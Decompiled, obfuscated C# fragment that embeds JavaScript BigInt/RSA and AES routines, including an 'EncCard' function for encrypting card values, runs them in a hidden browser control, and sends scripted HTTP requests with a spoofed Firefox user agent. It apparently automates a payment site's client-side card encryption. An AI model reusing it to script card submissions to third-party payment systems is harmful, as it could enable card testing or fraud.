{\r\n\t\t\t\t\tvar encryptedString = encrypted.substring(0, encrypted.length - 1);\r\n\t\t\t\t\te1 = encryptedString;\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t\tencryptChar();\r\n\t\t}\r\n\t\tencryption(encrypt);\r\n   return e1;\r\n\t};\r\nfunction setMaxDigits(e) {\r\n    maxDigits = e;\r\n    ZERO_ARRAY = new Array(maxDigits);\r\n    for (var t = 0; t < ZERO_ARRAY.length; t++)\r\n        ZERO_ARRAY[t] = 0;\r\n    bigZero = new BigInt;\r\n    bigOne = new BigInt;\r\n    bigOne.digits[0] = 1\r\n}\r\nfunction BigInt(e) {\r\n    if (typeof e == \"boolean\" && e == true)\r\n        this.digits = null ;\r\n    else\r\n        this.digits = ZERO_ARRAY.slice(0);\r\n    this.isNeg = false\r\n}\r\nfunction biFromDecimal(e) {\r\n    var t = e.charAt(0) == \"-\";\r\n    var n = t ? 1 : 0;\r\n    var r;\r\n    while (n < e.length && e.charAt(n) == \"0\")\r\n        ++n;\r\n    if (n == e.length)\r\n        r = new BigInt;\r\n    else {\r\n        var i = e.length - n;\r\n        var s = i % dpl10;\r\n        if (s == 0)\r\n            s = dpl10;\r\n        r = biFromNumber(Number(e.substr(n, s)));\r\n        n += s;\r\n        while (n < e.length) {\r\n            r = biAdd(biMultiply(r, biFromNumber(1e15)), biFromNumber(Number(e.substr(n, dpl10))));\r\n            n += dpl10\r\n        }\r\n        r.isNeg = t\r\n    }\r\n    return r\r\n}\r\nfunction biCopy(e) {\r\n    var t = new BigInt(true);\r\n    t.digits = e.digits.slice(0);\r\n    t.isNeg = e.isNeg;\r\n    return t\r\n}\r\nfunction biFromNumber(e) {\r\n    var t = new BigInt;\r\n    t.isNeg = e < 0;\r\n    e = Math.abs(e);\r\n    var n = 0;\r\n    while (e > 0) {\r\n        t.digits[n++] = e & maxDigitVal;\r\n        e >>= biRadixBits\r\n    }\r\n    return t\r\n}\r\nfunction reverseStr(e) {\r\n    var t = \"\";\r\n    for (var n = e.length - 1; n > -1; --n)\r\n        t += e.charAt(n);\r\n    return t\r\n}\r\nfunction biToString(e, t) {\r\n    var n = new BigInt;\r\n    n.digits[0] = t;\r\n    var r = biDivideModulo(e, n);\r\n    var i = hexatrigesimalToChar[r[1].digits[0]];\r\n    while (biCompare(r[0], bigZero) == 1) {\r\n        r = biDivideModulo(r[0], n);\r\n        digit = r[1].digits[0];\r\n        i += hexatrigesimalToChar[r[1].digits[0]]\r\n    }\r\n    return (e.isNeg ? \"-\" : \"\") + reverseStr(i)\r\n}\r\nfunction biToDecimal(e) {\r\n    var t = new BigInt;\r\n    t.digits[0] = 10;\r\n    var n = biDivideModulo(e, t);\r\n    var r = String(n[1].digits[0]);\r\n    while (biCompare(n[0], bigZero) == 1) {\r\n        n = biDivideModulo(n[0], t);\r\n        r += String(n[1].digits[0])\r\n    }\r\n    return (e.isNeg ? \"-\" : \"\") + reverseStr(r)\r\n}\r\nfunction digitToHex(e) {\r\n    var t = 15;\r\n    var n = \"\";\r\n    for (i = 0; i < 4; ++i) {\r\n        n += hexToChar[e & t];\r\n        e >>>= 4\r\n    }\r\n    return reverseStr(n)\r\n}\r\nfunction biToHex(e) {\r\n    var t = \"\";\r\n    var n = biHighIndex(e);\r\n    for (var r = biHighIndex(e); r > -1; --r)\r\n        t += digitToHex(e.digits[r]);\r\n    return t\r\n}\r\nfunction charToHex(e) {\r\n    var t = 48;\r\n    var n = t + 9;\r\n    var r = 97;\r\n    var i = r + 25;\r\n    var s = 65;\r\n    var o = 65 + 25;\r\n    var u;\r\n    if (e >= t && e <= n)\r\n        u = e - t;\r\n    else if (e >= s && e <= o)\r\n        u = 10 + e - s;\r\n    else if (e >= r && e <= i)\r\n        u = 10 + e - r;\r\n    else\r\n        u = 0;\r\n    return u\r\n}\r\nfunction hexToDigit(e) {\r\n    var t = 0;\r\n    var n = Math.min(e.length, 4);\r\n    for (var r = 0; r < n; ++r) {\r\n        t <<= 4;\r\n        t |= charToHex(e.charCodeAt(r))\r\n    }\r\n    return t\r\n}\r\nfunction biFromHex(e) {\r\n    var t = new BigInt;\r\n    var n = e.length;\r\n    for (var r = n, i = 0; r > 0; r -= 4,\r\n    ++i)\r\n        t.digits[i] = hexToDigit(e.substr(Math.max(r - 4, 0), Math.min(r, 4)));\r\n    return t\r\n}\r\nfunction biFromString(e, t) {\r\n    var n = e.charAt(0) == \"-\";\r\n    var r = n ? 1 : 0;\r\n    var i = new BigInt;\r\n    var s = new BigInt;\r\n    s.digits[0] = 1;\r\n    for (var o = e.length - 1; o >= r; o--) {\r\n        var u = e.charCodeAt(o);\r\n        var a = charToHex(u);\r\n        var f = biMultiplyDigit(s, a);\r\n        i = biAdd(i, f);\r\n        s = biMultiplyDigit(s, t)\r\n    }\r\n    i.isNeg = n;\r\n    return i\r\n}\r\nfunction biDump(e) {\r\n    return (e.isNeg ? \"-\" : \"\") + e.digits.join(\" \")\r\n}\r\nfunction biAdd(e, t) {\r\n    var n;\r\n    if (e.isNeg != t.isNeg) {\r\n        t.isNeg = !t.isNeg;\r\n        n = biSubtract(e, t);\r\n        t.isNeg = !t.isNeg\r\n    } else {\r\n        n = new BigInt;\r\n        var r = 0;\r\n        var i;\r\n        for (var s = 0; s < e.digits.length; ++s) {\r\n            i = e.digits[s] + t.digits[s] + r;\r\n            n.digits[s] = i & 65535;\r\n            r = Number(i >= biRadix)\r\n        }\r\n        n.isNeg = e.isNeg\r\n    }\r\n    return n\r\n}\r\nfunction biSubtract(e, t) {\r\n    var n;\r\n    if (e.isNeg != t.isNeg) {\r\n        t.isNeg = !t.isNeg;\r\n        n = biAdd(e, t);\r\n        t.isNeg = !t.isNeg\r\n    } else {\r\n        n = new BigInt;\r\n        var r, i;\r\n        i = 0;\r\n        for (var s = 0; s < e.digits.length; ++s) {\r\n            r = e.digits[s] - t.digits[s] + i;\r\n            n.digits[s] = r & 65535;\r\n            if (n.digits[s] < 0)\r\n                n.digits[s] += biRadix;\r\n            i = 0 - Number(r < 0)\r\n        }\r\n        if (i == -1) {\r\n            i = 0;\r\n            for (var s = 0; s < e.digits.length; ++s) {\r\n                r = 0 - n.digits[s] + i;\r\n                n.digits[s] = r & 65535;\r\n                if (n.digits[s] < 0)\r\n                    n.digits[s] += biRadix;\r\n                i = 0 - Number(r < 0)\r\n            }\r\n            n.isNeg = !e.isNeg\r\n        } else\r\n            n.isNeg = e.isNeg\r\n    }\r\n    return n\r\n}\r\nfunction biHighIndex(e) {\r\n    var t = e.digits.length - 1;\r\n    while (t > 0 && e.digits[t] == 0)\r\n        --t;\r\n    return t\r\n}\r\nfunction biNumBits(e) {\r\n    var t = biHighIndex(e);\r\n    var n = e.digits[t];\r\n    var r = (t + 1) * bitsPerDigit;\r\n    var i;\r\n    for (i = r; i > r - bitsPerDigit; --i) {\r\n        if ((n & 32768) != 0)\r\n            break;\r\n        n <<= 1\r\n    }\r\n    return i\r\n}\r\nfunction biMultiply(e, t) {\r\n    var n = new BigInt;\r\n    var r;\r\n    var i = biHighIndex(e);\r\n    var s = biHighIndex(t);\r\n    var o, u, a;\r\n    for (var f = 0; f <= s; ++f) {\r\n        r = 0;\r\n        a = f;\r\n        for (j = 0; j <= i; ++j,\r\n        ++a) {\r\n            u = n.digits[a] + e.digits[j] * t.digits[f] + r;\r\n            n.digits[a] = u & maxDigitVal;\r\n            r = u >>> biRadixBits\r\n        }\r\n        n.digits[f + i + 1] = r\r\n    }\r\n    n.isNeg = e.isNeg != t.isNeg;\r\n    return n\r\n}\r\nfunction biMultiplyDigit(e, t) {\r\n    var n, r, i;\r\n    result = new BigInt;\r\n    n = biHighIndex(e);\r\n    r = 0;\r\n    for (var s = 0; s <= n; ++s) {\r\n        i = result.digits[s] + e.digits[s] * t + r;\r\n        result.digits[s] = i & maxDigitVal;\r\n        r = i >>> biRadixBits\r\n    }\r\n    result.digits[1 + n] = r;\r\n    return result\r\n}\r\nfunction arrayCopy(e, t, n, r, i) {\r\n    var s = Math.min(t + i, e.length);\r\n    for (var o = t, u = r; o < s; ++o,\r\n    ++u)\r\n        n[u] = e[o]\r\n}\r\nfunction biShiftLeft(e, t) {\r\n    var n = Math.floor(t / bitsPerDigit);\r\n    var r = new BigInt;\r\n    arrayCopy(e.digits, 0, r.digits, n, r.digits.length - n);\r\n    var i = t % bitsPerDigit;\r\n    var s = bitsPerDigit - i;\r\n    for (var o = r.digits.length - 1, u = o - 1; o > 0; --o,\r\n    --u)\r\n        r.digits[o] = r.digits[o] << i & maxDigitVal | (r.digits[u] & highBitMasks[i]) >>> s;\r\n    r.digits[0] = r.digits[o] << i & maxDigitVal;\r\n    r.isNeg = e.isNeg;\r\n    return r\r\n}\r\nfunction biShiftRight(e, t) {\r\n    var n = Math.floor(t / bitsPerDigit);\r\n    var r = new BigInt;\r\n    arrayCopy(e.digits, n, r.digits, 0, e.digits.length - n);\r\n    var i = t % bitsPerDigit;\r\n    var s = bitsPerDigit - i;\r\n    for (var o = 0, u = o + 1; o < r.digits.length - 1; ++o,\r\n    ++u)\r\n        r.digits[o] = r.digits[o] >>> i | (r.digits[u] & lowBitMasks[i]) << s;\r\n    r.digits[r.digits.length - 1] >>>= i;\r\n    r.isNeg = e.isNeg;\r\n    return r\r\n}\r\nfunction biMultiplyByRadixPower(e, t) {\r\n    var n = new BigInt;\r\n    arrayCopy(e.digits, 0, n.digits, t, n.digits.length - t);\r\n    return n\r\n}\r\nfunction biDivideByRadixPower(e, t) {\r\n    var n = new BigInt;\r\n    arrayCopy(e.digits, t, n.digits, 0, n.digits.length - t);\r\n    return n\r\n}\r\nfunction biModuloByRadixPower(e, t) {\r\n    var n = new BigInt;\r\n    arrayCopy(e.digits, 0, n.digits, 0, t);\r\n    return n\r\n}\r\nfunction biCompare(e, t) {\r\n    if (e.isNeg != t.isNeg)\r\n        return 1 - 2 * Number(e.isNeg);\r\n    for (var n = e.digits.length - 1; n >= 0; --n)\r\n        if (e.digits[n] != t.digits[n])\r\n            if (e.isNeg)\r\n                return 1 - 2 * Number(e.digits[n] > t.digits[n]);\r\n            else\r\n                return 1 - 2 * Number(e.digits[n] < t.digits[n]);\r\n    return 0\r\n}\r\nfunction biDivideModulo(e, t) {\r\n    var n = biNumBits(e);\r\n    var r = biNumBits(t);\r\n    var i = t.isNeg;\r\n    var s, o;\r\n    if (n < r) {\r\n        if (e.isNeg) {\r\n            s = biCopy(bigOne);\r\n            s.isNeg = !t.isNeg;\r\n            e.isNeg = false;\r\n            t.isNeg = false;\r\n            o = biSubtract(t, e);\r\n            e.isNeg = true;\r\n            t.isNeg = i\r\n        } else {\r\n            s = new BigInt;\r\n            o = biCopy(e)\r\n        }\r\n        return new Array(s,o)\r\n    }\r\n    s = new BigInt;\r\n    o = e;\r\n    var u = Math.ceil(r / bitsPerDigit) - 1;\r\n    var a = 0;\r\n    while (t.digits[u] < biHalfRadix) {\r\n        t = biShiftLeft(t, 1);\r\n        ++a;\r\n        ++r;\r\n        u = Math.ceil(r / bitsPerDigit) - 1\r\n    }\r\n    o = biShiftLeft(o, a);\r\n    n += a;\r\n    var f = Math.ceil(n / bitsPerDigit) - 1;\r\n    var l = biMultiplyByRadixPower(t, f - u);\r\n    while (biCompare(o, l) != -1) {\r\n        ++s.digits[f - u];\r\n        o = biSubtract(o, l)\r\n    }\r\n    for (var c = f; c > u; --c) {\r\n        var h = c >= o.digits.length ? 0 : o.digits[c];\r\n        var p = c - 1 >= o.digits.length ? 0 : o.digits[c - 1];\r\n        var d = c - 2 >= o.digits.length ? 0 : o.digits[c - 2];\r\n        var v = u >= t.digits.length ? 0 : t.digits[u];\r\n        var m = u - 1 >= t.digits.length ? 0 : t.digits[u - 1];\r\n        if (h == v)\r\n            s.digits[c - u - 1] = maxDigitVal;\r\n        else\r\n            s.digits[c - u - 1] = Math.floor((h * biRadix + p) / v);\r\n        var g = s.digits[c - u - 1] * (v * biRadix + m);\r\n        var y = h * biRadixSquared + (p * biRadix + d);\r\n        while (g > y) {\r\n            --s.digits[c - u - 1];\r\n            g = s.digits[c - u - 1] * (v * biRadix | m);\r\n            y = h * biRadix * biRadix + (p * biRadix + d)\r\n        }\r\n        l = biMultiplyByRadixPower(t, c - u - 1);\r\n        o = biSubtract(o, biMultiplyDigit(l, s.digits[c - u - 1]));\r\n        if (o.isNeg) {\r\n            o = biAdd(o, l);\r\n            --s.digits[c - u - 1]\r\n        }\r\n    }\r\n    o = biShiftRight(o, a);\r\n    s.isNeg = e.isNeg != i;\r\n    if (e.isNeg) {\r\n        if (i)\r\n            s = biAdd(s, bigOne);\r\n        else\r\n            s = biSubtract(s, bigOne);\r\n        t = biShiftRight(t, a);\r\n        o = biSubtract(t, o)\r\n    }\r\n    if (o.digits[0] == 0 && biHighIndex(o) == 0)\r\n        o.isNeg = false;\r\n    return new Array(s,o)\r\n}\r\nfunction biDivide(e, t) {\r\n    return biDivideModulo(e, t)[0]\r\n}\r\nfunction biModulo(e, t) {\r\n    return biDivideModulo(e, t)[1]\r\n}\r\nfunction biMultiplyMod(e, t, n) {\r\n    return biModulo(biMultiply(e, t), n)\r\n}\r\nfunction biPow(e, t) {\r\n    var n = bigOne;\r\n    var r = e;\r\n    while (true) {\r\n        if ((t & 1) != 0)\r\n            n = biMultiply(n, r);\r\n        t >>= 1;\r\n        if (t == 0)\r\n            break;\r\n        r = biMultiply(r, r)\r\n    }\r\n    return n\r\n}\r\nfunction biPowMod(e, t, n) {\r\n    var r = bigOne;\r\n    var i = e;\r\n    var s = t;\r\n    while (true) {\r\n        if ((s.digits[0] & 1) != 0)\r\n            r = biMultiplyMod(r, i, n);\r\n        s = biShiftRight(s, 1);\r\n        if (s.digits[0] == 0 && biHighIndex(s) == 0)\r\n            break;\r\n        i = biMultiplyMod(i, i, n)\r\n    }\r\n    return r\r\n}\r\nfunction BarrettMu(e) {\r\n    this.modulus = biCopy(e);\r\n    this.k = biHighIndex(this.modulus) + 1;\r\n    var t = new BigInt;\r\n    t.digits[2 * this.k] = 1;\r\n    this.mu = biDivide(t, this.modulus);\r\n    this.bkplus1 = new BigInt;\r\n    this.bkplus1.digits[this.k + 1] = 1;\r\n    this.modulo = BarrettMu_modulo;\r\n    this.multiplyMod = BarrettMu_multiplyMod;\r\n    this.powMod = BarrettMu_powMod\r\n}\r\nfunction BarrettMu_modulo(e) {\r\n    var t = biDivideByRadixPower(e, this.k - 1);\r\n    var n = biMultiply(t, this.mu);\r\n    var r = biDivideByRadixPower(n, this.k + 1);\r\n    var i = biModuloByRadixPower(e, this.k + 1);\r\n    var s = biMultiply(r, this.modulus);\r\n    var o = biModuloByRadixPower(s, this.k + 1);\r\n    var u = biSubtract(i, o);\r\n    if (u.isNeg)\r\n        u = biAdd(u, this.bkplus1);\r\n    var a = biCompare(u, this.modulus) >= 0;\r\n    while (a) {\r\n        u = biSubtract(u, this.modulus);\r\n        a = biCompare(u, this.modulus) >= 0\r\n    }\r\n    return u\r\n}\r\nfunction BarrettMu_multiplyMod(e, t) {\r\n    var n = biMultiply(e, t);\r\n    return this.modulo(n)\r\n}\r\nfunction BarrettMu_powMod(e, t) {\r\n    var n = new BigInt;\r\n    n.digits[0] = 1;\r\n    while (true) {\r\n        if ((t.digits[0] & 1) != 0)\r\n            n = this.multiplyMod(n, e);\r\n        t = biShiftRight(t, 1);\r\n        if (t.digits[0] == 0 && biHighIndex(t) == 0)\r\n            break;\r\n        e = this.multiplyMod(e, e)\r\n    }\r\n    return n\r\n}\r\nvar biRadixBase = 2;\r\nvar biRadixBits = 16;\r\nvar bitsPerDigit = biRadixBits;\r\nvar biRadix = 1 << 16;\r\nvar biHalfRadix = biRadix >>> 1;\r\nvar biRadixSquared = biRadix * biRadix;\r\nvar maxDigitVal = biRadix - 1;\r\nvar maxInteger = 9999999999999998;\r\nvar maxDigits;\r\nvar ZERO_ARRAY;\r\nvar bigZero, bigOne;\r\nvar dpl10 = 15;\r\nvar highBitMasks = new Array(0,32768,49152,57344,61440,63488,64512,65024,65280,65408,65472,65504,65520,65528,65532,65534,65535);\r\nvar hexatrigesimalToChar = new Array(\"0\",\"1\",\"2\",\"3\",\"4\",\"5\",\"6\",\"7\",\"8\",\"9\",\"a\",\"b\",\"c\",\"d\",\"e\",\"f\",\"g\",\"h\",\"i\",\"j\",\"k\",\"l\",\"m\",\"n\",\"o\",\"p\",\"q\",\"r\",\"s\",\"t\",\"u\",\"v\",\"w\",\"x\",\"y\",\"z\");\r\nvar hexToChar = new Array(\"0\",\"1\",\"2\",\"3\",\"4\",\"5\",\"6\",\"7\",\"8\",\"9\",\"a\",\"b\",\"c\",\"d\",\"e\",\"f\");\r\nvar lowBitMasks = new Array(0,1,3,7,15,31,63,127,255,511,1023,2047,4095,8191,16383,32767,65535);\r\n</script>";
		array[4] = text3;
		string text4 = string.Concat(array);
		string text5 = "<html>\n<head>\n\n";
		string text6 = "\n\n\n\n</head>\n\n<body>\n\n\n\n</body>\n\n</html> \n\n";
		string text7 = text5 + text4 + text6;
		WebBrowser webBrowser = new WebBrowser();
		string urlString = "about:blank";
		webBrowser.Navigate(urlString);
		webBrowser.Document.Write(text7);
		HtmlDocument document = webBrowser.Document;
		string scriptName = "encryptUsingJS";
		return document.InvokeScript(scriptName, new object[2] { null, false }).ToString();
	}

	internal static string smethod_13(string string_8)
	{
		string[] array = new string[1];
		string text = "||";
		array[0] = text;
		string[] array2 = string_8.Split(array, StringSplitOptions.None);
		string string_9 = array2[0];
		string string_10 = array2[1];
		string text2 = "";
		if (array2.Length >= 3)
		{
			for (int i = 2; i < array2.Length; i++)
			{
				string text3 = text2;
				string text4 = smethod_14(array2[i], string_9, string_10);
				string text5 = "||";
				text2 = text3 + text4 + text5;
			}
			text2 = text2.Substring(0, text2.Length - 2);
		}
		return text2;
	}

	public static string smethod_14(string string_8, string string_9, string string_10)
	{
		string text = "<html><script>var BS=128;var BB=128;var RA=[,,,,[,,,,10,,12,,14],,[,,,,12,,12,,14],,[,,,,14,,14,,14]];var SO=[,,,,[,1,2,3],,[,1,2,3],,[,1,3,4]];var RC=[0x01,0x02,0x04, 0x08,0x10,0x20,0x40,0x80,0x1b,0x36,0x6c,0xd8,0xab,0x4d,0x9a,0x2f,0x5e,0xbc,0x63,0xc6,0x97,0x35,0x6a,0xd4,0xb3,0x7d,0xfa,0xef,0xc5,0x91];var SB=[99,124,119,123,242,107,111,197,48,1,103,43,254,215,171,118,202,130,201,125,250,89,71,240,173,212,162,175,156,164,114,192,183,253,147,38,54,63,247,204,52,165,229,241,113,216,49,21,4,199,35,195,24,150,5,154,7,18,128,226,235,39,178,117,9,131,44,26,27,110,90,160,82,59,214,179,41,227,47,132,83,209,0,237,32,252,177,91,106,203,190,57,74,76,88,207,208,239,170,251,67,77,51,133,69,249,2,127,80,60,159,168,81,163,64,143,146,157,56,245,188,182,218,33,16,255,243,210,205,12,19,236,95,151,68,23,196,167,126,61,100,93,25,115,96,129,79,220,34,42,144,136,70,238,184,20,222,94,11,219,224,50,58,10,73,6,36,92,194,211,172,98,145,149,228,121,231,200,55,109,141,213,78,169,108,86,244,234,101,122,174,8,186,120,37,46,28,166,180,198,232,221,116,31,75,189,139,138,112,62,181,102,72,3,246,14,97,53,87,185,134,193,29,158,225,248,152,17,105,217,142,148,155,30,135,233,206,85,40,223,140,161,137,13,191,230,66,104,65,153,45,15,176,84,187,22];var SBI=[82,9,106,213,48,54,165,56,191,64,163,158,129,243,215,251,124,227,57,130,155,47,255,135,52,142,67,68,196,222,233,203,84,123,148,50,166,194,35,61,238,76,149,11,66,250,195,78,8,46,161,102,40,217,36,178,118,91,162,73,109,139,209,37,114,248,246,100,134,104,152,22,212,164,92,204,93,101,182,146,108,112,72,80,253,237,185,218,94,21,70,87,167,141,157,132,144,216,171,0,140,188,211,10,247,228,88,5,184,179,69,6,208,44,30,143,202,63,15,2,193,175,189,3,1,19,138,107,58,145,17,65,79,103,220,234,151,242,207,206,240,180,230,115,150,172,116,34,231,173,53,133,226,249,55,232,28,117,223,110,71,241,26,113,29,41,197,137,111,183,98,14,170,24,190,27,252,86,62,75,198,210,121,32,154,219,192,254,120,205,90,244,31,221,168,51,136,7,199,49,177,18,16,89,39,128,236,95,96,81,127,169,25,181,74,13,45,229,122,159,147,201,156,239,160,224,59,77,174,42,245,176,200,235,187,60,131,83,153,97,23,43,4,126,186,119,214,38,225,105,20,99,85,33,12,125];function cSL(TA,PO){var T=TA.slice(0,PO);TA=TA.slice(PO).concat(T);return TA;}var Nk=BS/32;var Nb=BB/32;var Nr=RA[Nk][Nb];function XT(P){P<<=1;return((P&0x100)?(P^0x11B):(P));}function GF(x,y){var B,R=0;for(B=1;B<256;B*=2,y=XT(y)){if(x&B)R^=y;}return R;}function bS(SE,DR){var S;if(DR==\"e\")\tS=SB;else \tS=SBI;for(var i=0;i<4;i++)\tfor(var j=0;j<Nb;j++)\t\tSE[i][j]=S[SE[i][j]];}function sR(SE,DR){for(var i=1;i<4;i++)if(DR==\"e\")\tSE[i]=cSL(SE[i],SO[Nb][i]);else \tSE[i]=cSL(SE[i],Nb-SO[Nb][i]);}function mC(SE,DR){\tvar b=[];\tfor(var j=0;j<Nb;j++)\t\t{\t\tfor(var i=0;i<4;i++)\t\t{\t\t\tif(DR==\"e\")\t\t\t\tb[i]=GF(SE[i][j],2)^GF(SE[(i+1)%4][j],3)^SE[(i+2)%4][j]^SE[(i+3)%4][j];\t\t\telse\t\t\t\tb[i]=GF(SE[i][j],0xE)^GF(SE[(i+1)%4][j],0xB)^GF(SE[(i+2)%4][j],0xD)^GF(SE[(i+3)%4][j],9);\t\t}\t\tfor(var i=0;i<4;i++)\t\t\tSE[i][j]=b[i];\t\t}}function aRK(SE,RK){\tfor(var j=0;j<Nb;j++)\t{\t\tSE[0][j]^=(RK[j]&0xFF);\t\tSE[1][j]^=((RK[j]>>8)&0xFF);\t\tSE[2][j]^=((RK[j]>>16)&0xFF);\t\tSE[3][j]^=((RK[j]>>24) & 0xFF);\t}}function YE(Y){var EY=[];var T;Nk=BS/32;Nb=BB/32;Nr=RA[Nk][Nb];for(var j=0;j<Nk;j++)\tEY[j]=(Y[4*j])|(Y[4*j+1]<<8)|(Y[4*j+2]<<16)|(Y[4*j+3]<<24);for(j=Nk;j<Nb*(Nr+1);j++){T=EY[j-1];if(j%Nk==0)\tT=((SB[(T>>8)&0xFF])|(SB[(T>>16)&0xFF]<<8)|(SB[(T>>24)&0xFF]<<16)|(SB[T&0xFF]<<24))^RC[Math.floor(j/Nk)-1];else if(Nk>6&&j%Nk==4)\tT=(SB[(T>>24)&0xFF]<<24)|(SB[(T>>16)&0xFF]<<16)|(SB[(T>>8)&0xFF]<<8)|(SB[T&0xFF]);EY[j]=EY[j-Nk]^T;}return EY;}function Rd(SE,RK){bS(SE,\"e\");sR(SE,\"e\");mC(SE,\"e\");aRK(SE,RK);}function iRd(SE,RK){aRK(SE,RK);mC(SE,\"d\");sR(SE,\"d\");bS(SE, \"d\");}function FRd(SE,RK){bS(SE,\"e\");sR(SE,\"e\");aRK(SE,RK);}function iFRd(SE,RK){aRK(SE,RK);sR(SE,\"d\");bS(SE,\"d\");}function encrypt(bk,EY){\tvar i;\tif(!bk||bk.length*8!=BB)\t\treturn;\tif(!EY)\t\treturn;bk=pB(bk);\taRK(bk,EY);\tfor(i=1;i<Nr;i++)\t\tRd(bk,EY.slice(Nb*i,Nb*(i+1)));\tFRd(bk,EY.slice(Nb*Nr));return uPB(bk);}function decrypt(bk,EY){var i;\tif(!bk||bk.length*8!=BB)\t\treturn;\tif(!EY)\t\treturn;bk=pB(bk);iFRd(bk,EY.slice(Nb*Nr));\t\tfor(i=Nr-1;i>0;i--)\t\t\tiRd(bk,EY.slice(Nb*i,Nb*(i+1)));aRK(bk,EY);\t\t\treturn uPB(bk);}function byteArrayToString(bA){\tvar R=\"\";\tfor(var i=0;i<bA.length; i++)\tif(bA[i]!=0)R+=String.fromCharCode(bA[i]);\treturn R;}function byteArrayToHex(bA){var R=\"\";if(!bA)\treturn;for(var i=0;i<bA.length;i++)\tR+=((bA[i]<16)?\"0\":\"\")+bA[i].toString(16);return R;}function hexToByteArray(hS){var bA=[];if(hS.length%2)return;if(hS.indexOf(\"0x\")==0||hS.indexOf(\"0X\")==0)hS = hS.substring(2);\tfor (var i=0;i<hS.length;i+=2)bA[Math.floor(i/2)]=parseInt(hS.slice(i,i+2),16);return bA;}function pB(OT){var SE = [];if(!OT||OT.length%4)return;SE[0]=[];SE[1]=[];SE[2]=[];SE[3]=[];for(var j=0;j<OT.length;j+=4){SE[0][j/4]=OT[j];SE[1][j/4]=OT[j+1];SE[2][j/4]=OT[j+2];SE[3][j/4]=OT[j+3];}return SE;}function uPB(PK){var R=[];for(var j=0;j<PK[0].length;j++){R[R.length]=PK[0][j];R[R.length]=PK[1][j];R[R.length]=PK[2][j];R[R.length]=PK[3][j];}return R;}function fPT(PT){var bpb=BB/8;var i;if(typeof PT==\"string\"||PT.indexOf){PT=PT.split(\"\");for(i=0;i<PT.length;i++)PT[i]=PT[i].charCodeAt(0)&0xFF;}for(i=bpb-(PT.length%bpb);i>0&&i<bpb;i--) PT[PT.length]=0;return PT;}function gRB(hM){var i;var bt=[];for(i=0;i<hM;i++)bt[i]=Math.round(Math.random()*255);return bt;}function rijndaelEncrypt(PT,Y,M){var EY,i,abk;var bpb=BB/8;var ct;if(!PT||!Y)return;if(Y.length*8!=BS)return;if(M==\"CBC\")ct=gRB(bpb);else {M=\"ECB\";ct=[];}PT=fPT(PT);EY=YE(Y);for (var bk=0; bk<PT.length/bpb;bk++){abk=PT.slice(bk*bpb,(bk+1)*bpb);if(M==\"CBC\")for (var i=0;i<bpb; i++)abk[i] ^= ct[bk*bpb+i];ct=ct.concat(encrypt(abk,EY));}return ct;}function rijndaelDecrypt(CT,Y,M){var EY;var bpb=BB/8;var pt=[];var abk;var bk;if(!CT||!Y||typeof CT==\"string\")return;if(Y.length*8!=BS)return;if(!M)M=\"ECB\";EY=YE(Y);for(bk=(CT.length/bpb)-1;bk>0;bk--){abk=decrypt(CT.slice(bk*bpb,(bk+1)*bpb),EY);if(M==\"CBC\")for(var i=0;i<bpb;i++)pt[(bk-1)*bpb+i]=abk[i]^CT[(bk-1)*bpb+i];else pt=abk.concat(pt);}if(M==\"ECB\") pt=decrypt(CT.slice(0,bpb),EY).concat(pt);return pt;}function stringToByteArray(st){var bA=[];for(var i=0;i<st.length; i++)bA[i]=st.charCodeAt(i);return bA;}function genkey(){\tvar j=\"\";\twhile(1)\t{\t\tvar i=Math.random().toString();\t\tj+=i.substring(i.lastIndexOf(\".\")+1);\t\tif(j.length>31)\t\t\treturn j.substring(0, 32);\t}}function EncCard(fValue, payId, mode){return byteArrayToHex(rijndaelEncrypt(fValue,hexToByteArray(payId), mode))}</script><body></body></html>";
		string text2 = text;
		WebBrowser webBrowser = new WebBrowser();
		string urlString = "about:blank";
		webBrowser.Navigate(urlString);
		webBrowser.Document.Write(text2);
		HtmlDocument document = webBrowser.Document;
		string scriptName = "EncCard";
		return document.InvokeScript(scriptName, new object[3] { string_8, string_9, string_10 }).ToString();
	}

	internal static string smethod_15(string string_8, string string_9, string string_10, string string_11, string string_12, string string_13)
	{
		string[] array = new string[10];
		string text = "5#";
		array[0] = text;
		array[1] = HttpUtility.UrlEncode(string_8);
		string text2 = "|$|";
		array[2] = text2;
		array[3] = string_9;
		string text3 = "|$|";
		array[4] = text3;
		array[5] = string_10;
		string text4 = "|$|";
		array[6] = text4;
		array[7] = string_11;
		string text5 = "|$|";
		array[8] = text5;
		array[9] = string_12;
		return smethod_6(string.Concat(array));
	}

	internal static string smethod_16(string string_8, string string_9, ref string string_10)
	{
		string empty = string.Empty;
		string_10 = "";
		try
		{
			HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(string_8);
			httpWebRequest.ProtocolVersion = HttpVersion.Version11;
			httpWebRequest.ReadWriteTimeout = 50000;
			string accept = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
			httpWebRequest.Accept = accept;
			string userAgent = "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0";
			httpWebRequest.UserAgent = userAgent;
			string contentType = "application/x-www-form-urlencoded; charset=UTF-8";
			httpWebRequest.ContentType = contentType;
			string contentType2 = "application/json";
			httpWebRequest.ContentType = contentType2;
			httpWebRequest.KeepAlive = true;
			httpWebRequest.Timeout = 50000;
			if (string_9 != "")
			{
				string method = "POST";
				httpWebRequest.Method = method;
				byte[] bytes = Encoding.UTF8.GetBytes(string_9);
				httpWebRequest.ContentLength = bytes.Length;
				Stream requestStream = httpWebRequest.GetRequestStream();
				requestStream.Write(bytes, 0, bytes.Length);
				requestStream.Close();
			}
			else
			{
				string method2 = "GET";
				httpWebRequest.Method = method2;
				httpWebRequest.ContentLength = 0L;
			}
			try
			{
				HttpWebResponse httpWebResponse = httpWebRequest.GetResponse() as HttpWebResponse;
				Stream responseStream = httpWebResponse.GetResponseStream();
				empty = new StreamReader(responseStream, Encoding.Default).ReadToEnd();
				responseStream.Close();
				httpWebResponse.Close();
				string text = empty;
				string value = "Serialization/\">";
				if (text.IndexOf(value) > 0)
				{
					string text2 = empty;
					string text3 = empty;
					string value2 = "Serialization/\">";
					empty = text2.Substring(text3.IndexOf(value2) + 16);
					string text4 = empty;
					string text5 = empty;
					string value3 = "<";
					empty = text4.Substring(0, text5.IndexOf(value3));
					string text6 = empty;
					string oldValue = " ";
					empty = text6.Replace(oldValue, "").Trim();
				}
				string text7 = empty;
				string value4 = "Exception";
				if (text7.Contains(value4))
				{
					empty = "";
				}
				return empty;
			}
			catch (Exception)
			{
			}
		}
